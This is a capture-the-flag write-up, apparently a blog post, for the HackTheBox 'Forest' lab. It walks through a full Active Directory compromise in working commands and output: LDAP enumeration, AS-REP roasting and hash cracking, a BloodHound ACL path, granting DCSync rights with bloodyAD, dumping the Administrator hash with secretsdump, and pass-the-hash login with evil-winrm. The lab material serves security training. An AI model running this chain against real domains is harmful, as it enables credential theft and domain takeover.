---
title: Forest
categories: [HackTheBox]
tags: [windows, ldap, kerberos, smb, nmap, impacket, hashcat, kerbrute, bloodhound, netexec]
media_subpath: /images/hackthebox_forest/
image:
  path: 'https://labs.hackthebox.com/storage/avatars/7dedecb452597150647e73c2dd6c24c7.png'
---

## Summary 
The Forest box was compromised by first identifying it as a Domain Controller of a domain and confirming [LDAP anonymous bind](/theory/protocols/ldap/#anonymous-bind). LDAP enumeration revealed a service account, `svc-alfresco`, which had Kerberos pre-authentication disabled, making it vulnerable to [AS-REP Roasting](/theory/protocols/kerberos#as-rep-roast-attack). The hash was retrieved using `GetNPUsers.py`, cracked to reveal the password `<redacted>` and authenticated access was gained. Using this account, [BloodHound](https://github.com/SpecterOps/BloodHound) tool revealed it had [GenericAll](/theory/windows/AD/acl#access-rights-bits) rights on a group with [DCSync](/theory/windows/AD/DCSync#attacking-with-dcsync) privileges. By adding `svc-alfresco` to this group and enabling `DCSync` with [bloodyAD](https://github.com/CravateRouge/bloodyAD), the Administrator's NTLM hash was dumped using `secretsdump.py`, granting full domain admin access.

## Nmap Scan

We start our enumeration of the given IP Address by running an `nmap` scan
- nmap scan

```shell
nmap -sVC -Pn -oN nmap -vv 10.10.10.161
```
> Command breakdown:
- `nmap` : This command is used to run the nmap tool.
- `-sVC` : This flag is the combination of the `-sV` and `-sC` flags, which specifies that we want to run a service version scan and a script scan, respectively.
{: .prompt-info}

### Relevant Ports
```
53/tcp    open  domain       syn-ack Simple DNS Plus 
88/tcp    open  kerberos-sec syn-ack Microsoft Windows Kerberos (server time: 2025-04-24 02:31:11Z) 
135/tcp   open  msrpc        syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap         syn-ack Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) 
445/tcp   open  microsoft-ds syn-ack Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?    syn-ack
593/tcp   open  ncacn_http   syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped   syn-ack -> Domain Controller indicattor
3268/tcp  open  ldap         syn-ack Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped   syn-ack
5985/tcp  open  http         syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

> Ports for services such as LDAP, DNS and Kerberos are big indicators that the target is likely a Windows Domain Controller. 
{: .prompt-tip}

## Nmap Scripts

Host script results:

### Smb
```shell
| smb-os-discovery:
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3) -> Windows Version
|   Computer name: FOREST -> Computer Name
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local -> Domain Name -> Set in /etc/hosts
|   Forest name: htb.local
|   FQDN: FOREST.htb.local -> FQDN -> Set in /etc/hosts
|_  System time: 2025-04-23T19:32:05-07:00
| smb2-time:
|   date: 2025-04-24T02:32:06
|_  start_date: 2025-04-24T02:26:53
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 32753/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 33940/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 44587/udp): CLEAN (Timeout)
|   Check 4 (port 21123/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
|_clock-skew: mean: 2h26m48s, deviation: 4h02m30s, median: 6m47s -> Clock Skew
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required

```

Valuable information to take notes are presented to us with the default nmap scripts, such as:
- The system time is 2h26m48s ahead of our machine, which indicates a clock skew. This can cause issues with Kerberos authentication.
- The system is running Windows Server 2016 Standard 14393.
- The system is a Domain Controller for the domain htb.local.
- The system hostname is FOREST.
- The FQDN is FOREST.htb.local.


> From the nmap script result we can see that the system time have a clock skew of 2h26m48s , which indicates that the system time is not in sync with our machine. So If we try to do any type of authentication with kerberos we will get a KRB_AP_ERR_SKEW error, which can be fixed by fixing the clock with `ntpdate` or forging one with `faketime`. 
{: .prompt-warning}

## SMB

We can also enumerate the domain and hostname using the `netexec` tool, which gives us the same information compacted in one line 

- NXC Enumeration

```shell
nxc smb forest.htb.local
SMB         10.10.10.161    445    FOREST           [*] Windows 10 / Server 2016 Build 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
```

With this information we can add the domain to our /etc/hosts file along with the IP address of the target machine 

```shell
cat /etc/hosts
10.10.10.161	FOREST.htb.local htb.local
```

We can try to connect to the SMB share using the `smbclient` command, but we will get a permission denied error because we are not authenticated, and it does not allow anonymous access.

## LDAP

Without much to go on on SMB, we can try to enumerate the LDAP service, see if it is possible to make an anonymous bind. We can do that automatically with the `nmap` script, which will enumerate the LDAP service and try to make an anonymous bind, or we could simply try an anonymous bind using `ldapsearch`.

> To manually check if we can bind to the LDAP service, we can use the `ldapsearch` command with the `-D ""` flag to specify that we want to bind anonymously.
{: .prompt-info}


- Automatically with nmap

```shell
nmap -n -sV --script "ldap* and not brute" forest.htb.local #Using anonymous credentials
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-24 02:41 UTC
Nmap scan report for forest.htb.local (10.10.10.161)
<SNIP>
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
| ldap-rootdse:
| LDAP Results
|   <ROOT>
|       currentTime: 20250424024917.0Z
|       subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=htb,DC=local
|       dsServiceName: CN=NTDS Settings,CN=FOREST,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=htb,DC=local
|       namingContexts: DC=htb,DC=local
|       namingContexts: CN=Configuration,DC=htb,DC=local
|       namingContexts: CN=Schema,CN=Configuration,DC=htb,DC=local
|       namingContexts: DC=DomainDnsZones,DC=htb,DC=local
|       namingContexts: DC=ForestDnsZones,DC=htb,DC=local
<SNIP>

```

Since we have an anonymous bind, we can enumerate the LDAP service using `ldapsearch` and the `-LLL` flag to get a more readable output. 

Searching for Users with `ldapsearch` 

```shell
ldapsearch -LLL -H ldap://FOREST.htb.local -D "" -b "DC=htb,DC=local" "(objectClass=person)" sAMAccountName dn
```

it didn't give us every special user because we are not querying for "Service Accounts", From the Service Accounts we get another user, `svc-alfresco`

```shell
  ldapsearch -LLL -H ldap://FOREST.htb.local -D "" -b "OU=Service Accounts,DC=htb,DC=local"  dn

dn: OU=Service Accounts,DC=htb,DC=local

dn: CN=svc-alfresco,OU=Service Accounts,DC=htb,DC=local

```

> breaking down the command:
- `-LLL` : This flag is used to format the output in a more readable way, removing the LDAP version and other unnecessary information.
- `-H ldap://FOREST.htb.local` : This flag specifies the LDAP server to connect to.
- `-D ""` : This flag specifies the bind DistinguishedName, what user we will authenticate as, which is empty in this case, indicating an anonymous bind.
- `-b "DC=htb,DC=local"` : This flag specifies the base DN to search from. In this case, we are searching from the root of the domain. We could also try more specific base DNs, such as "OU=Service Accounts,DC=htb,DC=local" to search for service accounts.
- `"(objectClass=person)"` : This flag specifies the search filter. In this case, we are searching for all objects of class "person". We could also try more specific filters, such as "(sAMAccountName=svc-alfresco)" to search for a specific user.
- `dn` : This flag specifies the attribute to return. In this case, we are returning the dn attribute, which is the Distinguished Name of the user.
{: .prompt-info}


We can save the enumerated users in a list called Users and use a tool called `kerbrute` to enumerate the users and check if they have pre-authentication disabled so we can AS-REP roast them.

## Kerberos

```shell

kerbrute --dc FOREST.htb.local -d htb.local userenum ./Users

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: dev (n/a) - 04/24/25 - Ronnie Flathers @ropnop

2025/04/24 03:11:20 >  Using KDC(s):
2025/04/24 03:11:20 >   FOREST.htb.local:88

2025/04/24 03:11:20 >  [+] VALID USERNAME:       FOREST$@htb.local
2025/04/24 03:11:20 >  [+] VALID USERNAME:       EXCH01$@htb.local
2025/04/24 03:11:20 >  [+] VALID USERNAME:       HealthMailboxfc9daad@htb.local
2025/04/24 03:11:20 >  [+] VALID USERNAME:       HealthMailbox670628e@htb.local
2025/04/24 03:11:20 >  [+] VALID USERNAME:       HealthMailboxc0a90c9@htb.local
2025/04/24 03:11:20 >  [+] VALID USERNAME:       HealthMailboxc3d7722@htb.local
2025/04/24 03:11:20 >  [+] VALID USERNAME:       HealthMailbox968e74d@htb.local
2025/04/24 03:11:20 >  [+] VALID USERNAME:       HealthMailbox6ded678@htb.local
2025/04/24 03:11:20 >  [+] VALID USERNAME:       HealthMailbox83d6781@htb.local
2025/04/24 03:11:20 >  [+] VALID USERNAME:       santi@htb.local
2025/04/24 03:11:20 >  [+] VALID USERNAME:       andy@htb.local
2025/04/24 03:11:20 >  [+] VALID USERNAME:       mark@htb.local
2025/04/24 03:11:20 >  [+] VALID USERNAME:       lucinda@htb.local
2025/04/24 03:11:20 >  [+] VALID USERNAME:       sebastien@htb.local
2025/04/24 03:11:20 >  [+] VALID USERNAME:       HealthMailboxfd87238@htb.local
2025/04/24 03:11:20 >  [+] VALID USERNAME:       HealthMailbox7108a4e@htb.local
2025/04/24 03:11:20 >  [+] VALID USERNAME:       HealthMailboxb01ac64@htb.local
2025/04/24 03:11:20 >  [+] VALID USERNAME:       HealthMailbox0659cc1@htb.local
2025/04/24 03:11:21 >  [+] svc-alfresco has no pre auth required. Dumping hash to crack offline:
$krb5asrep$18$svc-alfresco@HTB.LOCAL:3eb7745e244def212128c1ed3ab6c3be$9ecbb4e643c7221f84156d8a3b180b7c85467361cf794cbc97a4582ff94c1f5a888b42da4caf4e22d7f4ccc92e38e7014f6599ee7db616907cd1c0f01cb05d1295e9bf06de09dd54c681b98e6c2cd353a7ae78379a94c6025b558b4e36286db9770b768c3b49c2d43103a7caee8e3393c0140dd3cb5470e25f354097f1abdba0aacaa8f14ccf37b908553fa57556d152f92a29cf035ed3c93f0b1bea2572bc6bd19ec3c5bc120b1ab7fac0e0136ff54d4e222b447ee3a170a60a3901637a4b5227230e17c34131f557c7db12d2774e72b43c121434537dcf26b0818b81284b8e135f9dc28c99888df86f94772e21c3ec62fea61c9bf43330b281
2025/04/24 03:11:21 >  [+] VALID USERNAME:       svc-alfresco@htb.local
2025/04/24 03:11:21 >  Done! Tested 31 usernames (19 valid) in 0.938 seconds

```

We get the hash for the user svc-alfresco using the AS-REP Roasting technique to get the hash and we try to crack it offline using `hashcat`.

```
Approaching final keyspace - workload adjusted.

Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$18$svc-alfresco@HTB.LOCAL:3eb7745e244def...30b281
Time.Started.....: Thu Apr 24 03:12:35 2025 (1 sec)
Time.Estimated...: Thu Apr 24 03:12:36 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  9102.9 kH/s (6.38ms) @ Accel:1024 Loops:1 Thr:32 Vec:1
Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)
Progress.........: 14344383/14344383 (100.00%)
Rejected.........: 0/14344383 (0.00%)
Restore.Point....: 14344383/14344383 (100.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: $HEX[3032313342] -> $HEX[042a0337c2a156616d6f732103]
Hardware.Mon.#1..: Temp: 49c Util: 48% Core:1740MHz Mem:6001MHz Bus:8

Started: Thu Apr 24 03:12:33 2025
Stopped: Thu Apr 24 03:12:37 2025

```

At first, it seems we can't crack the hash, but we can see that hashcat is trying to use the wrong hash type. Hashcat is autodetecting kerberos 5, etype 23, but our hash is not of that format

![Hashcat](file-20250424042332815.png)

which etype 18 is not for the hashtype we currently have

![Hashcat2](file-20250424042325639.png)

- We can prevent this by downgrading the hash with kerbrute using the flag `--downgrade` to use the arcfour-hmac-md5 encryption type, which is the one we need to crack the hash.

```shell
kerbrute --dc FOREST.htb.local -d htb.local userenum ./Users --downgrade
<SNIP>
2025/04/24 03:16:51 >  [+] svc-alfresco has no pre auth required. Dumping hash to crack offline:
$krb5asrep$23$svc-alfresco@HTB.LOCAL:4e642fded4cfba11da8b7c9e13b03b59$ecfd876d978c03d966519923d151fb8ced63e52c4e3b1c688095533516eb069fa5decf80b090bda12765ded3f71395438b0caf0680b8c9b340c0d8f91b90af9b8bf17888ac361117fb0c58a2849deaef7e1ec1b5d17844bcc84d7a078f54a8d1592a5d985a113f46901994bb5333b3e21a291de64af20345b27c5aa066bf1ccc35d3bbdc24de45280ee8f9e4ca286d00f43a0565561703d45faa01d41fe5e959a6bd581828adfbd30791ca6d7ed954a614b0326430ca69ae64d11423dc2786d6c65489e6e069ca48687327bcde4fdf7b0949db57a8f6a468a22251ab05ea6e38f1465ceb5573
2025/04/24 03:16:51 >  [+] VALID USERNAME:       svc-alfresco@htb.local
2025/04/24 03:16:51 >  Done! Tested 31 usernames (19 valid) in 0.984 seconds

```

> Detection of AS-REP Roasting vulnerable targets and tickets request could also be done with impacket's `GetNPUsers.py` (getting the same hash)
{: .prompt-info}

```shell

GetNPUsers.py htb.local/ -request
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

Name          MemberOf                                                PasswordLastSet             LastLogon                   UAC
------------  ------------------------------------------------------  --------------------------  --------------------------  --------
svc-alfresco  CN=Service Accounts,OU=Security Groups,DC=htb,DC=local  2025-04-24 03:22:36.744309  2025-04-24 03:18:08.962459  0x410200


/home/h4z4rd0u5/.local/bin/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
$krb5asrep$23$svc-alfresco@HTB.LOCAL:88ee2abdd5d5a83e00e26d4fb94da3d0$ab5f7b5fae91441e86d5fd1988d974feea6539cb3394e3645bfc8300b725848dc0b08c8a8a3163a25a121bc71301f30ac2ca4377c33dc303d51fbce10a4def78cd916e520e6ef2fb36182d390f00c7fcb9e91ac762f2c745d3adaabdae50e08a1e6d0265cd157f94506dc0aa2788b730bbfa577280f955d97c9fbb13a1e8cf3c94e65de7e396ef33e1636addb40cad28f611262b5421ffa2e0c5cbacc223ba070d76bd3111f7073830d9dc92a3722ad22b645b696e4a7b451390199b018e6abdfb17d428057500486bc703d18f79b0bc6e799ff74fcca3717fcf6576b0b8260677a5ae4082ab
```

Now hashcat can crack our hash, revealing the password for the user svc-alfresco

```
hashcat ./svc-alfresco.hash --show

<SNIP>
18200 | Kerberos 5, etype 23, AS-REP | Network Protocol

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

$krb5asrep$23$svc-alfresco@HTB.LOCAL:4e642fded4cfba11da8b7c9e13b03b59$ecfd876d978c03d966519923d151fb8ced63e52c4e3b1c688095533516eb069fa5decf80b090bda12765ded3f71395438b0caf0680b8c9b340c0d8f91b90af9b8bf17888ac361117fb0c58a2849deaef7e1ec1b5d17844bcc84d7a078f54a8d1592a5d985a113f46901994bb5333b3e21a291de64af20345b27c5aa066bf1ccc35d3bbdc24de45280ee8f9e4ca286d00f43a0565561703d45faa01d41fe5e959a6bd581828adfbd30791ca6d7ed954a614b0326430ca69ae64d11423dc2786d6c65489e6e069ca48687327bcde4fdf7b0949db57a8f6a468a22251ab05ea6e38f1465ceb5573:<redacted>
```

## SMB/LDAP/BLOODHOUND

With our credentials, we can now authenticate to the SMB share using the `nxc` command and see if we have any unusual share access
```
nxc smb forest.htb.local -u svc-alfresco -p <redacted> --shares
SMB         10.10.10.161    445    FOREST           [*] Windows 10 / Server 2016 Build 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.10.10.161    445    FOREST           [+] htb.local\svc-alfresco:<redacted>
SMB         10.10.10.161    445    FOREST           [*] Enumerated shares
SMB         10.10.10.161    445    FOREST           Share           Permissions     Remark
SMB         10.10.10.161    445    FOREST           -----           -----------     ------
SMB         10.10.10.161    445    FOREST           ADMIN$                          Remote Admin
SMB         10.10.10.161    445    FOREST           C$                              Default share
SMB         10.10.10.161    445    FOREST           IPC$            READ            Remote IPC
SMB         10.10.10.161    445    FOREST           NETLOGON        READ            Logon server share
SMB         10.10.10.161    445    FOREST           SYSVOL          READ            Logon server share
```
> Command breakdown:
- `nxc smb forest.htb.local` : This command is used to connect to the SMB share on the target machine.
- `-u svc-alfresco` : This flag specifies the username to authenticate with.
- `-p <redacted>` : This flag specifies the password to authenticate with.
- `--shares` : This flag specifies that we want to enumerate the shares on the target machine.
{: .prompt-info}

Nothing out of the ordinary, we can also try to enumerate the domain using a tool called bloodhound.

```shell
bloodhound-ce-python -d htb.local -u svc-alfresco -p '<redacted>' -ns 10.10.10.161 -dc FOREST.htb.local --zip -c all
INFO: BloodHound.py for BloodHound Community Edition
INFO: Found AD domain: htb.local
INFO: Getting TGT for user
INFO: Connecting to LDAP server: FOREST.htb.local
WARNING: Kerberos auth to LDAP failed, trying NTLM
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: FOREST.htb.local
WARNING: Kerberos auth to LDAP failed, trying NTLM
INFO: Found 32 users
INFO: Found 76 groups
INFO: Found 2 gpos
INFO: Found 15 ous
INFO: Found 20 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: EXCH01.htb.local
INFO: Querying computer: FOREST.htb.local
WARNING: Failed to get service ticket for FOREST.htb.local, falling back to NTLM auth
CRITICAL: CCache file is not found. Skipping...
WARNING: DCE/RPC connection failed: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Done in 01M 13S
INFO: Compressing output into 20250424032608_bloodhound.zip
```
> Command breakdown:
- `bloodhound-ce-python` : This command is used to run the BloodHound Python for the Community Edition of Bloodhound.
- `-d htb.local` : This flag specifies the domain to enumerate.
- `-u svc-alfresco` : This flag specifies the username to authenticate with.
- `-p '<redacted>'` : This flag specifies the password to authenticate with.
- `-ns 10.10.10.161` : This flag specifies the IP address of the LDAP server to connect to.
- `-dc FOREST.htb.local` : This flag specifies the domain controller to connect to.
- `--zip` : This flag specifies that we want to compress the output into a zip file. Otherwise, we would get a collection of `.json` files.
- `-c all` : This flag specifies that we want to collect all the data from the domain.
{: .prompt-info}

We can see some errors of authentication using Kerberos. This is because of the clock skew we saw before. We can ignore this for now, as we are still able to authenticate via NTLM.

After setting up bloodhound-ce, we start to enumerate our user permissions

We see we have outbound object control, which is generally a good indicator that we have some sort of control or possibility of lateral movement over the domain.

![Outbound](Pasted image 20250424033342.png)

From the big number of objects that we have some outbound control, we are probably member of an elevated group that has rights over various members

![AO](file-20250424042252753.png)

We are inherit the rights of the Account operators group, which is a default group in Active Directory that has the ability to create, delete, and modify user accounts and groups. This group is typically used for delegating administrative tasks to non-administrative users. We can see that we have the ability to modify the group "EXCHANGE WINDOWS PERMISSIONS" which is a group that has [WriteDacl](/theory/windows/AD/acl#access-rights-bits) rights over the domain. 

![GAll](file-20250424042301509.png)

We can follow the path of the GenericAll shown on bloodhound for the group

![Path](file-20250424042128421.png)

This path involves the following steps:
- We have the ability to modify the group "EXCHANGE WINDOWS PERMISSIONS" which is a group that has WriteDacl rights over the domain.
- We can add ourselves to this group, using the `bloodyAD` tool. 
- We then use the WriteDacl rights that we inherited from the "EXCHANGE WINDOWS PERMISSIONS" group to make ourselves able to DCSync the domain.
- DCSync the domain

```shell
bloodyAD --host FOREST.htb.local -u svc-alfresco -p <redacted> add groupMember "EXCHANGE WINDOWS PERMISSIONS" svc-alfresco
[+] svc-alfresco added to EXCHANGE WINDOWS PERMISSIONS

bloodyAD --host FOREST.htb.local -u svc-alfresco -p <redacted> add dcsync svc-alfresco
[+] svc-alfresco is now able to DCSync

secretsdump.py -just-dc-user Administrator htb.local/svc-alfresco@FOREST.htb.local
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
[*] Kerberos keys grabbed
htb.local\Administrator:aes256-cts-hmac-sha1-96:910e4c922b7516d4a27f05b5ae6a147578564284fff8461a02298ac9263bc913
htb.local\Administrator:aes128-cts-hmac-sha1-96:b5880b186249a067a5f6b814a23ed375
htb.local\Administrator:des-cbc-md5:c1e049c71f57343b
[*] Cleaning up...

```

> Command breakdown:
- `bloodyAD --host FOREST.htb.local -u svc-alfresco -p <redacted> add groupMember "EXCHANGE WINDOWS PERMISSIONS" svc-alfresco` : This command adds the user svc-alfresco to the group "EXCHANGE WINDOWS PERMISSIONS".
- `bloodyAD --host FOREST.htb.local -u svc-alfresco -p <redacted> add dcsync svc-alfresco` : This command enables DCSync rights for the user svc-alfresco.
- `secretsdump.py` : This command dumps the NTDS.DIT secrets from the domain controller using the DRSUAPI method.
- `-just-dc-user Administrator` : This flag specifies that we want to dump the NTDS.DIT secrets only for the user Administrator.
{: .prompt-info}

With the `Administrator`'s NTLM hash, we can now authenticate to the WinRM service using the `evil-winrm` command and we now have a full Domain Admin access to the machine.

```powershell

evil-winrm -i forest.htb.local -u Administrator -H '32693b11e6aa90eb43d32c72a07ceea6'

*Evil-WinRM* PS C:\Users> gci -recurse -file -include "*.txt"
    Directory: C:\Users\Administrator\Desktop
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        4/23/2025   7:27 PM             34 root.txt
    Directory: C:\Users\svc-alfresco\Desktop
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        4/23/2025   7:27 PM             34 user.txt
```

## Conclusion
### Quick Recap
- The machine is a Domain Controller, which is indicated by the presence of LDAP, Kerberos and SMB services.
- The machine has LDAP anonymous bind enabled, which allows us to enumerate users and groups without authentication.
- The machine has a service account, `svc-alfresco`, which has Kerberos pre-authentication disabled, making it vulnerable to AS-REP Roasting.
- The machine has a group, "EXCHANGE WINDOWS PERMISSIONS", which has the `WriteDacl` rights to perform a DCSync attack over the domain.

### Lessons Learned / To be reforced
- Enumerate anonymous bind on LDAP to gather information about the domain
- Check every user for pre-authentication disabled
- Use `kerbrute` or `Get-NPUsers` to enumerate users and check for AS-REP Roasting and use the `--downgrade` flag to force the hash type
- Pay attention to the hashcat autodetect feature, using hashcat wiki examples to check if it is the correct hash type 
